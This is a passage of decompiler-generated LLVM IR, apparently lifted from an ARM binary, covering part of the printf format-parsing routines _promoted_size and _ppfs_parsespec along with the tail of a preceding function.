  store i32 %v1_bc40, i32* %v2_bbc8, align 4
  %v0_bc48 = load i32, i32* %r2.global-to-local, align 4
  %v1_bc48 = load i32, i32* %ip.global-to-local, align 4
  %v2_bc48 = inttoptr i32 %v1_bc48 to i32*
  store i32 %v0_bc48, i32* %v2_bc48, align 4
  br label %dec_label_pc_bc78

dec_label_pc_bc50:                                ; preds = %dec_label_pc_bbe8, %dec_label_pc_bc20
  %v3_bc50 = load i32, i32* %v2_bbc8, align 4
  store i32 %v3_bc50, i32* %r2.global-to-local, align 4
  %v1_bc54 = add i32 %v3_bc50, 8
  store i32 %v1_bc54, i32* %r3.global-to-local, align 4
  store i32 %v1_bc54, i32* %v2_bbc8, align 4
  %v0_bc5c = load i32, i32* %r2.global-to-local, align 4
  %v1_bc5c = inttoptr i32 %v0_bc5c to i32*
  %v2_bc5c = load i32, i32* %v1_bc5c, align 4
  store i32 %v2_bc5c, i32* %r3.global-to-local, align 4
  %v3_bc5c = add i32 %v0_bc5c, 4
  %v4_bc5c = inttoptr i32 %v3_bc5c to i32*
  %v5_bc5c = load i32, i32* %v4_bc5c, align 4
  store i32 %v5_bc5c, i32* %r4.global-to-local, align 4
  %v0_bc60 = load i32, i32* %ip.global-to-local, align 4
  %v1_bc60 = inttoptr i32 %v0_bc60 to i32*
  store i32 %v2_bc5c, i32* %v1_bc60, align 4
  %v3_bc60 = add i32 %v0_bc60, 4
  %v4_bc60 = inttoptr i32 %v3_bc60 to i32*
  %v5_bc60 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_bc60, i32* %v4_bc60, align 4
  br label %dec_label_pc_bc78

dec_label_pc_bc68:                                ; preds = %dec_label_pc_bbfc, %dec_label_pc_bbe8, %dec_label_pc_bbdc, %dec_label_pc_bc20
  %v1_bc68 = add i32 %v3_bbc8, 4
  store i32 %v1_bc68, i32* %r3.global-to-local, align 4
  store i32 %v1_bc68, i32* %v2_bbc8, align 4
  %v0_bc70 = load i32, i32* %r1.global-to-local, align 4
  %v1_bc70 = inttoptr i32 %v0_bc70 to i32*
  %v2_bc70 = load i32, i32* %v1_bc70, align 4
  store i32 %v2_bc70, i32* %r3.global-to-local, align 4
  %v1_bc74 = load i32, i32* %ip.global-to-local, align 4
  %v2_bc74 = inttoptr i32 %v1_bc74 to i32*
  store i32 %v2_bc70, i32* %v2_bc74, align 4
  br label %dec_label_pc_bc78

dec_label_pc_bc78:                                ; preds = %dec_label_pc_bc50, %dec_label_pc_bc3c, %dec_label_pc_bc28, %dec_label_pc_bc68
  %v0_bc78 = load i32, i32* %ip.global-to-local, align 4
  %v1_bc78 = add i32 %v0_bc78, 8
  store i32 %v1_bc78, i32* %ip.global-to-local, align 4
  %v0_bc7c.pre = load i32, i32* @lr, align 4
  %v0_bc80.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_bc7c

dec_label_pc_bc7c:                                ; preds = %dec_label_pc_bbb8, %dec_label_pc_bc78
  %v0_bc80 = phi i32 [ %v0_bc8025, %dec_label_pc_bbb8 ], [ %v0_bc80.pre, %dec_label_pc_bc78 ]
  %v0_bc7c = phi i32 [ %v1_bbb824, %dec_label_pc_bbb8 ], [ %v0_bc7c.pre, %dec_label_pc_bc78 ]
  %v1_bc7c = add i32 %v0_bc7c, 1
  store i32 %v1_bc7c, i32* @lr, align 4
  %v1_bc80 = add i32 %v0_bc80, 28
  %v2_bc80 = inttoptr i32 %v1_bc80 to i32*
  %v3_bc80 = load i32, i32* %v2_bc80, align 4
  store i32 %v3_bc80, i32* %r3.global-to-local, align 4
  %v5_bc88 = icmp slt i32 %v1_bc7c, %v3_bc80
  br i1 %v5_bc88, label %dec_label_pc_bbb8, label %dec_label_pc_bc80.dec_label_pc_bc8c.loopexit_crit_edge

dec_label_pc_bc90:                                ; preds = %entry
  br i1 %v6_bb6c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_bc90
  %v2_bc94 = add i32 %v0_bb54, 36
  %v3_bc94 = inttoptr i32 %v2_bc94 to i8*
  %v4_bc94 = load i8, i8* %v3_bc94, align 1
  %v5_bc94 = zext i8 %v4_bc94 to i32
  %v5_bc98 = mul nuw nsw i32 %v5_bc94, 8
  %v6_bc98 = add i32 %v5_bc98, %v1_bb60
  store i32 %v6_bc98, i32* %r3.global-to-local, align 4
  %v2_bc9c = add i32 %v6_bc98, -8
  %v3_bc9c = inttoptr i32 %v2_bc9c to i32*
  %v4_bc9c = load i32, i32* %v3_bc9c, align 4
  store i32 %v4_bc9c, i32* %r3.global-to-local, align 4
  store i32 %v4_bc9c, i32* %v2_bb64, align 4
  %v0_bca4.pre = load i32, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_bc90, %bb
  %v2_bcb8 = phi i32 [ %v0_bca4.pre, %bb ], [ %v0_bb54, %dec_label_pc_bc90 ]
  %v1_bca4 = add i32 %v2_bcb8, 4
  %v2_bca4 = inttoptr i32 %v1_bca4 to i32*
  %v3_bca4 = load i32, i32* %v2_bca4, align 4
  store i32 %v3_bca4, i32* %r3.global-to-local, align 4
  %v6_bca8 = icmp eq i32 %v3_bca4, -2147483648
  br i1 %v6_bca8, label %bb15, label %dec_label_pc_bc8c

bb15:                                             ; preds = %.thread2
  %v2_bcac = add i32 %v2_bcb8, 37
  %v3_bcac = inttoptr i32 %v2_bcac to i8*
  %v4_bcac = load i8, i8* %v3_bcac, align 1
  %v5_bcac = zext i8 %v4_bcac to i32
  %v1_bcb0 = load i32, i32* %ip.global-to-local, align 4
  %v5_bcb0 = mul nuw nsw i32 %v5_bcac, 8
  %v6_bcb0 = add i32 %v5_bcb0, %v1_bcb0
  store i32 %v6_bcb0, i32* %r3.global-to-local, align 4
  %v2_bcb4 = add i32 %v6_bcb0, -8
  %v3_bcb4 = inttoptr i32 %v2_bcb4 to i32*
  %v4_bcb4 = load i32, i32* %v3_bcb4, align 4
  store i32 %v4_bcb4, i32* %r3.global-to-local, align 4
  store i32 %v4_bcb4, i32* %v2_bca4, align 4
  %v0_bcbc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_bc8c

dec_label_pc_bc80.dec_label_pc_bc8c.loopexit_crit_edge: ; preds = %dec_label_pc_bc7c
  br label %dec_label_pc_bc8c.loopexit

dec_label_pc_bc8c.loopexit:                       ; preds = %dec_label_pc_bc80.dec_label_pc_bc8c.loopexit_crit_edge, %dec_label_pc_bbb0
  %v0_bc80.lcssa = phi i32 [ %v0_bc80, %dec_label_pc_bc80.dec_label_pc_bc8c.loopexit_crit_edge ], [ %v0_bc8018, %dec_label_pc_bbb0 ]
  br label %dec_label_pc_bc8c

dec_label_pc_bc8c:                                ; preds = %dec_label_pc_bc8c.loopexit, %.thread2, %bb15
  %v1_bcdc = phi i32 [ %v0_bc80.lcssa, %dec_label_pc_bc8c.loopexit ], [ %v2_bcb8, %.thread2 ], [ %v0_bcbc.pre, %bb15 ]
  %v1_bcbc = add i32 %v1_bcdc, 8
  %v2_bcbc = inttoptr i32 %v1_bcbc to i32*
  %v3_bcbc = load i32, i32* %v2_bcbc, align 4
  store i32 %v3_bcbc, i32* %r1.global-to-local, align 4
  %v1_bcc0 = icmp slt i32 %v3_bcbc, 0
  br i1 %v1_bcc0, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_bc8c
  %v5_bcc4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_bcc4, i32* @r4, align 4
  ret i32 %v1_bcdc

bb17:                                             ; preds = %dec_label_pc_bc8c
  %v1_bcc8 = add i32 %v1_bcdc, 16
  %v2_bcc8 = inttoptr i32 %v1_bcc8 to i32*
  %v3_bcc8 = load i32, i32* %v2_bcc8, align 4
  %v1_bcd0 = sub i32 0, %v3_bcbc
  store i32 %v1_bcd0, i32* %r1.global-to-local, align 4
  %v1_bccc = and i32 %v3_bcc8, -10
  %v1_bcd4 = or i32 %v1_bccc, 8
  store i32 %v1_bcd4, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_bcdc = add i32 %v1_bcdc, 20
  %v3_bcdc = inttoptr i32 %v2_bcdc to i32*
  store i32 32, i32* %v3_bcdc, align 4
  %v0_bce0 = load i32, i32* %r1.global-to-local, align 4
  %v1_bce0 = load i32, i32* @r0, align 4
  %v2_bce0 = add i32 %v1_bce0, 8
  %v3_bce0 = inttoptr i32 %v2_bce0 to i32*
  store i32 %v0_bce0, i32* %v3_bce0, align 4
  %v0_bce4 = load i32, i32* %r3.global-to-local, align 4
  %v1_bce4 = load i32, i32* @r0, align 4
  %v2_bce4 = add i32 %v1_bce4, 16
  %v3_bce4 = inttoptr i32 %v2_bce4 to i32*
  store i32 %v0_bce4, i32* %v3_bce4, align 4
  %v2_bce8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_bce8, i32* @r4, align 4
  %v8_bce8 = load i32, i32* @r0, align 4
  ret i32 %v8_bce8

; uselistorder directives
  uselistorder i32 %v1_bc7c, { 2, 1, 0 }
  uselistorder i32 %v0_bc80, { 1, 2, 0 }
  uselistorder i32 %v3_bbc8, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_bbc8, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_bbbc, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v1_bbb824, { 1, 0 }
  uselistorder i32 %v0_bc8018, { 2, 0, 1 }
  uselistorder i32 %v0_bb54, { 0, 3, 1, 2, 5, 4, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_bc8c, { 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_bc7c, { 1, 0 }
  uselistorder label %dec_label_pc_bc78, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_bc68, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_bc50, { 1, 0 }
  uselistorder label %dec_label_pc_bc3c, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_bbb8, { 1, 0 }
  uselistorder label %dec_label_pc_bbb0, { 1, 0 }
  uselistorder label %dec_label_pc_bb8c, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_bd08.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_bcf4

dec_label_pc_bcf4:                                ; preds = %dec_label_pc_bd10, %entry
  %v0_bcf4 = phi i32 [ %v1_bcf4, %dec_label_pc_bd10 ], [ ptrtoint (i32* @global_var_143e8.458 to i32), %entry ]
  %v1_bcf4 = add i32 %v0_bcf4, -2
  %v1_bcf8 = add i32 %v0_bcf4, -1
  %v2_bcf8 = inttoptr i32 %v1_bcf8 to i8*
  %v3_bcf8 = load i8, i8* %v2_bcf8, align 1
  %v4_bcf8 = zext i8 %v3_bcf8 to i32
  %v1_bcfc = inttoptr i32 %v1_bcf4 to i8*
  %v2_bcfc = load i8, i8* %v1_bcfc, align 2
  %v3_bcfc = zext i8 %v2_bcfc to i32
  %v3_bd00 = mul nuw i32 %v4_bcf8, 16777216
  %v4_bd04 = sdiv i32 %v3_bd00, 65536
  %v5_bd04 = or i32 %v4_bd04, %v3_bcfc
  %v9_bd08 = icmp eq i32 %v5_bd04, %v1_bd08.pre
  br i1 %v9_bd08, label %dec_label_pc_bcf4.dec_label_pc_bd1c_crit_edge, label %dec_label_pc_bd10

dec_label_pc_bcf4.dec_label_pc_bd1c_crit_edge:    ; preds = %dec_label_pc_bcf4
  br label %dec_label_pc_bd1c

dec_label_pc_bd10:                                ; preds = %dec_label_pc_bcf4
  %tmp = icmp ugt i32 %v1_bcf4, ptrtoint (i32* @global_var_143d0.460 to i32)
  br i1 %tmp, label %dec_label_pc_bcf4, label %dec_label_pc_bd1c

dec_label_pc_bd1c:                                ; preds = %dec_label_pc_bd10, %dec_label_pc_bcf4.dec_label_pc_bd1c_crit_edge
  %v2_bd24.pre-phi = sub i32 %v1_bcf4, ptrtoint (i32* @global_var_143d0.460 to i32)
  store i32 ptrtoint (i32* @global_var_143e8.458 to i32), i32* @r2, align 4
  %v4_bd28 = sdiv i32 %v2_bd24.pre-phi, 2
  %v5_bd28 = add i32 %v4_bd28, ptrtoint (i32* @global_var_143e8.458 to i32)
  %v6_bd28 = inttoptr i32 %v5_bd28 to i8*
  %v7_bd28 = load i8, i8* %v6_bd28, align 1
  %v9_bd28 = zext i8 %v7_bd28 to i32
  ret i32 %v9_bd28

; uselistorder directives
  uselistorder i32 %v1_bcf4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_bcf4, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_143e8.458 to i32), { 1, 2, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp106 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_bd3c = load i32, i32* @r4, align 4
  store i32 %v3_bd3c, i32* %stack_var_-32, align 4
  %v6_bd3c = load i32, i32* @r5, align 4
  %v25_bd3c = ptrtoint i32* %stack_var_-32 to i32
  %v1_bd40 = add i32 %tmp, 16
  %v2_bd40 = inttoptr i32 %v1_bd40 to i32*
  %v3_bd40 = load i32, i32* %v2_bd40, align 4
  %v2_bd44 = ptrtoint i32* %stack_var_-88 to i32
  %v1_bd48 = and i32 %v3_bd40, 128
  store i32 %v1_bd48, i32* @r4, align 4
  %v2_bd48 = icmp eq i32 %v1_bd48, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r7.global-to-local, align 4
  %v1_bd68 = add i32 %tmp, 24
  %v2_bd68 = inttoptr i32 %v1_bd68 to i32*
  %v3_bd68 = load i32, i32* %v2_bd68, align 4
  store i32 %v3_bd68, i32* %sb.global-to-local, align 4
  br i1 %v2_bd48, label %bb, label %dec_label_pc_bd88

bb:                                               ; preds = %entry
  %v3_bd6c = load i32, i32* %arg1, align 4
  br label %dec_label_pc_bdd4

dec_label_pc_bd78:                                ; preds = %dec_label_pc_bf58
  %v0_bd78 = load i32, i32* %r0.global-to-local, align 4
  %v0_bf88.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_bf80

dec_label_pc_bd80:                                ; preds = %dec_label_pc_bf84
  %v1_bd80 = add i32 %v0_bf88.pre, 1
  store i32 %v1_bd80, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_bfa0

dec_label_pc_bd88:                                ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bd8c

dec_label_pc_bd8c:                                ; preds = %dec_label_pc_bdc0.dec_label_pc_bd8c_crit_edge, %dec_label_pc_bd88
  %v1_bd9c = phi i32 [ %v1_bdb0, %dec_label_pc_bdc0.dec_label_pc_bd8c_crit_edge ], [ 0, %dec_label_pc_bd88 ]
  %v0_bd8c = phi i32 [ %v0_bd8c.pre, %dec_label_pc_bdc0.dec_label_pc_bd8c_crit_edge ], [ %tmp, %dec_label_pc_bd88 ]
  %v1_bd8c = inttoptr i32 %v0_bd8c to i32*
  %v2_bd8c = load i32, i32* %v1_bd8c, align 4
  %v4_bd90 = mul i32 %v1_bd9c, 4
  %v5_bd90 = add i32 %v2_bd8c, %v4_bd90
  store i32 %v5_bd90, i32* %r3.global-to-local, align 4
  %v1_bd94 = add i32 %v5_bd90, -4
  %v2_bd94 = inttoptr i32 %v1_bd94 to i32*
  %v3_bd94 = load i32, i32* %v2_bd94, align 4
  store i32 %v3_bd94, i32* %r1.global-to-local, align 4
  store i32 %v25_bd3c, i32* @ip, align 4
  %v2_bd9c = add i32 %v1_bd9c, %v25_bd3c
  store i32 %v2_bd9c, i32* %r2.global-to-local, align 4
  %v1_bda0 = trunc i32 %v3_bd94 to i8
  %v3_bda0 = add i32 %v2_bd9c, -56
  %v4_bda0 = inttoptr i32 %v3_bda0 to i8*
  store i8 %v1_bda0, i8* %v4_bda0, align 1
  %v0_bda4 = load i32, i32* %r2.global-to-local, align 4
  %v1_bda4 = add i32 %v0_bda4, -56
  %v2_bda4 = inttoptr i32 %v1_bda4 to i8*
  %v3_bda4 = load i8, i8* %v2_bda4, align 1
  %v4_bda4 = zext i8 %v3_bda4 to i32
  store i32 %v4_bda4, i32* %r2.global-to-local, align 4
  %v0_bda8 = load i32, i32* %r3.global-to-local, align 4
  %v1_bda8 = add i32 %v0_bda8, -4
  %v2_bda8 = inttoptr i32 %v1_bda8 to i32*
  %v3_bda8 = load i32, i32* %v2_bda8, align 4
  store i32 %v3_bda8, i32* %r3.global-to-local, align 4
  %v9_bdac = icmp eq i32 %v4_bda4, %v3_bda8
  %v0_bdb0 = load i32, i32* %r0.global-to-local, align 4
  %v1_bdb0 = add i32 %v0_bdb0, 1
  store i32 %v1_bdb0, i32* %r0.global-to-local, align 4
  br i1 %v9_bdac, label %dec_label_pc_bdb8, label %dec_label_pc_c1d0

dec_label_pc_bdb8:                                ; preds = %dec_label_pc_bd8c
  %v2_bdb8 = icmp eq i8 %v3_bda4, 0
  br i1 %v2_bdb8, label %dec_label_pc_bdc8, label %dec_label_pc_bdc0

dec_label_pc_bdc0:                                ; preds = %dec_label_pc_bdb8
  %tmp166 = icmp ult i32 %v1_bdb0, 32
  br i1 %tmp166, label %dec_label_pc_bdc0.dec_label_pc_bd8c_crit_edge, label %dec_label_pc_bdc8

dec_label_pc_bdc0.dec_label_pc_bd8c_crit_edge:    ; preds = %dec_label_pc_bdc0
  %v0_bd8c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_bd8c

dec_label_pc_bdc8:                                ; preds = %dec_label_pc_bdc0, %dec_label_pc_bdb8
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bdd0 = ptrtoint i32* %stack_var_-87 to i32
  br label %dec_label_pc_bdd4

dec_label_pc_bdd4:                                ; preds = %bb, %dec_label_pc_bdc8
  %storemerge102 = phi i32 [ %v2_bdd0, %dec_label_pc_bdc8 ], [ %v3_bd6c, %bb ]
  store i32 %storemerge102, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_bde4

dec_label_pc_bde0:                                ; preds = %.thread22, %dec_label_pc_bef0
  %v0_bde0 = phi i32 [ %v2_bf68, %.thread22 ], [ %storemerge105, %dec_label_pc_bef0 ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.3, %.thread22 ], [ %stack_var_-48.2, %dec_label_pc_bef0 ]
  store i32 %v0_bde0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_bde4

dec_label_pc_bde4:                                ; preds = %dec_label_pc_bdd4, %dec_label_pc_bde0
  %v1_be00 = phi i32 [ %storemerge102, %dec_label_pc_bdd4 ], [ %v0_bde0, %dec_label_pc_bde0 ]
  %stack_var_-48.1 = phi i32 [ %tmp106, %dec_label_pc_bdd4 ], [ %stack_var_-48.0, %dec_label_pc_bde0 ]
  %v1_bde4 = inttoptr i32 %v1_be00 to i8*
  %v2_bde4 = load i8, i8* %v1_bde4, align 1
  %v3_bde4 = zext i8 %v2_bde4 to i32
  store i32 %v3_bde4, i32* %r3.global-to-local, align 4
  %v7_bde8 = icmp eq i8 %v2_bde4, 42
  br i1 %v7_bde8, label %bb124, label %.thread9.thread

.thread9.thread:                                  ; preds = %dec_label_pc_bde4
  store i32 %v1_be00, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

bb124:                                            ; preds = %dec_label_pc_bde4
  %v1_bdf4 = load i32, i32* @lr, align 4
  %v4_bdf4 = mul i32 %v1_bdf4, -4
  %v5_bdf4 = add i32 %v4_bdf4, %v25_bd3c
  store i32 %v5_bdf4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_be00 = add i32 %v1_be00, 1
  store i32 %v2_be00, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_be08 = add i32 %v5_bdf4, -12
  %v4_be08 = inttoptr i32 %v3_be08 to i32*
  store i32 0, i32* %v4_be08, align 4
  %v0_be2c.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb124, %.thread9.thread
  %v0_be2c.pre = phi i32 [ %v0_be2c.pre.pre, %bb124 ], [ %v1_be00, %.thread9.thread ]
  %v2_be30.pre = load i32, i32* @global_var_1e7a4, align 4
  br label %.backedge

dec_label_pc_be10:                                ; preds = %.backedge
  store i32 4094, i32* %r3.global-to-local, align 4
  %v0_be14 = load i32, i32* %r0.global-to-local, align 4
  %v7_be18 = icmp sgt i32 %v0_be14, 4094
  br i1 %v7_be18, label %.thread12, label %bb126

.thread12:                                        ; preds = %dec_label_pc_be10
  %v1_be2014 = add i32 %v0_bea4, 1
  store i32 %v1_be2014, i32* %r6.global-to-local, align 4
  br label %.backedge

bb126:                                            ; preds = %dec_label_pc_be10
  %v11_be1c = mul i32 %v0_be14, 10
  %v12_be1c = add i32 %v11_be1c, %v3_be2c
  store i32 %v12_be1c, i32* %r3.global-to-local, align 4
  %v1_be20 = add i32 %v0_bea4, 1
  store i32 %v1_be20, i32* %r6.global-to-local, align 4
  %v9_be24 = add i32 %v12_be1c, -48
  store i32 %v9_be24, i32* %r0.global-to-local, align 4
  br label %.backedge

.backedge:                                        ; preds = %.thread12, %bb126, %.preheader
  %v0_bea4 = phi i32 [ %v0_be2c.pre, %.preheader ], [ %v1_be20, %bb126 ], [ %v1_be2014, %.thread12 ]
  store i32 124836, i32* %r3.global-to-local, align 4
  %v1_be2c = inttoptr i32 %v0_bea4 to i8*
  %v2_be2c = load i8, i8* %v1_be2c, align 1
  %v3_be2c = zext i8 %v2_be2c to i32
  store i32 %v3_be2c, i32* %r2.global-to-local, align 4
  store i32 %v2_be30.pre, i32* %r3.global-to-local, align 4
  %v3_be34 = mul nuw nsw i32 %v3_be2c, 2
  %v4_be34 = add i32 %v3_be34, %v2_be30.pre
  %v5_be34 = inttoptr i32 %v4_be34 to i8*
  %v6_be34 = load i8, i8* %v5_be34, align 1
  %v8_be34 = zext i8 %v6_be34 to i32
  store i32 %v8_be34, i32* %r3.global-to-local, align 4
  %v1_be38 = and i32 %v8_be34, 8
  %v2_be38 = icmp eq i32 %v1_be38, 0
  br i1 %v2_be38, label %dec_label_pc_be40, label %dec_label_pc_be10

dec_label_pc_be40:                                ; preds = %.backedge
  %v0_be40 = load i32, i32* %r1.global-to-local, align 4
  %v1_be40 = add i32 %v0_be40, -1
  %v2_be40 = inttoptr i32 %v1_be40 to i8*
  %v3_be40 = load i8, i8* %v2_be40, align 1
  %v4_be40 = zext i8 %v3_be40 to i32
  store i32 %v4_be40, i32* %r3.global-to-local, align 4
  %v7_be44 = icmp eq i8 %v3_be40, 37
  br i1 %v7_be44, label %dec_label_pc_be4c, label %dec_label_pc_bf08

dec_label_pc_be4c:                                ; preds = %dec_label_pc_be40
  %v7_be4c = icmp eq i8 %v2_be2c, 36
  %. = zext i1 %v7_be4c to i32
  store i32 %., i32* @ip, align 4
  %v0_be58 = load i32, i32* %r0.global-to-local, align 4
  %tmp129 = icmp slt i32 %v0_be58, 1
  br i1 %tmp129, label %bb130, label %thread-pre-split

bb130:                                            ; preds = %dec_label_pc_be4c
  store i32 0, i32* @ip, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_be4c, %bb130
  %v1_beb4 = phi i32 [ 0, %bb130 ], [ %., %dec_label_pc_be4c ]
  %v2_be60 = icmp eq i32 %v1_beb4, 0
  %v0_be90 = load i32, i32* %sb.global-to-local, align 4
  br i1 %v2_be60, label %dec_label_pc_be90, label %dec_label_pc_be68

dec_label_pc_be68:                                ; preds = %thread-pre-split
  %v2_be90 = icmp eq i32 %v0_be90, 0
  %v1_be6c = add i32 %v0_bea4, 1
  store i32 %v1_be6c, i32* %r1.global-to-local, align 4
  br i1 %v2_be90, label %dec_label_pc_c1d0, label %dec_label_pc_be74

dec_label_pc_be74:                                ; preds = %dec_label_pc_be68
  %v2_be74 = sub i32 %v0_be58, %v0_be90
  %v4_be74 = xor i32 %v0_be90, %v0_be58
  %v5_be74 = xor i32 %v2_be74, %v0_be58
  %v6_be74 = and i32 %v5_be74, %v4_be74
  %v7_be74 = icmp slt i32 %v6_be74, 0
  %v8_be74 = icmp slt i32 %v2_be74, 0
  %v9_be74 = icmp eq i32 %v0_be58, %v0_be90
  %v3_be78 = xor i1 %v8_be74, %v7_be74
  %v4_be78 = or i1 %v9_be74, %v3_be78
  br i1 %v4_be78, label %dec_label_pc_be88, label %bb131

bb131:                                            ; preds = %dec_label_pc_be74
  store i32 %v0_be58, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_be88

dec_label_pc_be84:                                ; preds = %dec_label_pc_bea4, %dec_label_pc_beac
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_be88

dec_label_pc_be88:                                ; preds = %bb131, %dec_label_pc_be74, %dec_label_pc_be84
  %v0_be88 = phi i32 [ %v0_be40, %dec_label_pc_be84 ], [ %v1_be6c, %dec_label_pc_be74 ], [ %v1_be6c, %bb131 ]
  %stack_var_-48.2 = phi i32 [ %stack_var_-48.1, %dec_label_pc_be84 ], [ %v0_be58, %dec_label_pc_be74 ], [ %v0_be58, %bb131 ]
  br label %dec_label_pc_bec0

dec_label_pc_be90:                                ; preds = %thread-pre-split
  %tmp132 = icmp slt i32 %v0_be90, 1
  br i1 %tmp132, label %dec_label_pc_bea4, label %dec_label_pc_be98

dec_label_pc_be98:                                ; preds = %dec_label_pc_be90
  %v7_be98 = icmp eq i8 %v2_be2c, 109
  br i1 %v7_be98, label %dec_label_pc_bf08, label %dec_label_pc_c1d0

dec_label_pc_bea4:                                ; preds = %dec_label_pc_be90
  %tmp167 = icmp ugt i32 %v0_bea4, %v0_be40
  br i1 %tmp167, label %dec_label_pc_beac, label %dec_label_pc_be84

dec_label_pc_beac:                                ; preds = %dec_label_pc_bea4
  %v1_beac = inttoptr i32 %v0_be40 to i8*
  %v2_beac = load i8, i8* %v1_beac, align 1
  %v3_beac = zext i8 %v2_beac to i32
  store i32 %v3_beac, i32* %r3.global-to-local, align 4
  %v7_beb0 = icmp eq i8 %v2_beac, 48
  br i1 %v7_beb0, label %dec_label_pc_be84, label %bb133

bb133:                                            ; preds = %dec_label_pc_beac
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_bf08

dec_label_pc_bec0.loopexit:                       ; preds = %dec_label_pc_bec8
  %v1_bed4 = load i32, i32* @r4, align 4
  %v3_bed4 = or i32 %v1_bed4, %v0_bee8
  store i32 %v3_bed4, i32* @r4, align 4
  %v2_bed8 = add i32 %storemerge105, 1
  br label %dec_label_pc_bec0

dec_label_pc_bec0:                                ; preds = %dec_label_pc_bec0.loopexit, %dec_label_pc_be88
  %storemerge105 = phi i32 [ %v0_be88, %dec_label_pc_be88 ], [ %v2_bed8, %dec_label_pc_bec0.loopexit ]
  store i32 %storemerge105, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_143c8.467 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_becc = inttoptr i32 %storemerge105 to i8*
  br label %dec_label_pc_bec8

dec_label_pc_bec8:                                ; preds = %dec_label_pc_bee0, %dec_label_pc_bec0
  %v0_bee8 = phi i32 [ %v2_bee8, %dec_label_pc_bee0 ], [ 1, %dec_label_pc_bec0 ]
  %v0_bec8 = phi i32 [ %v5_bec8, %dec_label_pc_bee0 ], [ ptrtoint ([8 x i8]* @global_var_143c8.467 to i32), %dec_label_pc_bec0 ]
  %v1_bec8 = inttoptr i32 %v0_bec8 to i8*
  %v2_bec8 = load i8, i8* %v1_bec8, align 1
  %v3_bec8 = zext i8 %v2_bec8 to i32
  store i32 %v3_bec8, i32* %r2.global-to-local, align 4
  %v5_bec8 = add i32 %v0_bec8, 1
  store i32 %v5_bec8, i32* %r1.global-to-local, align 4
  %v2_becc = load i8, i8* %v1_becc, align 1
  %v3_becc = zext i8 %v2_becc to i32
  store i32 %v3_becc, i32* %r3.global-to-local, align 4
  %v9_bed0 = icmp eq i8 %v2_becc, %v2_bec8
  br i1 %v9_bed0, label %dec_label_pc_bec0.loopexit, label %dec_label_pc_bee0

dec_label_pc_bee0:                                ; preds = %dec_label_pc_bec8
  %v1_bee0 = inttoptr i32 %v5_bec8 to i8*
  %v2_bee0 = load i8, i8* %v1_bee0, align 1
  %v3_bee0 = zext i8 %v2_bee0 to i32
  store i32 %v3_bee0, i32* %r3.global-to-local, align 4
  %v2_bee4 = icmp eq i8 %v2_bee0, 0
  %v2_bee8 = mul i32 %v0_bee8, 2
  store i32 %v2_bee8, i32* %r0.global-to-local, align 4
  br i1 %v2_bee4, label %dec_label_pc_bef0, label %dec_label_pc_bec8

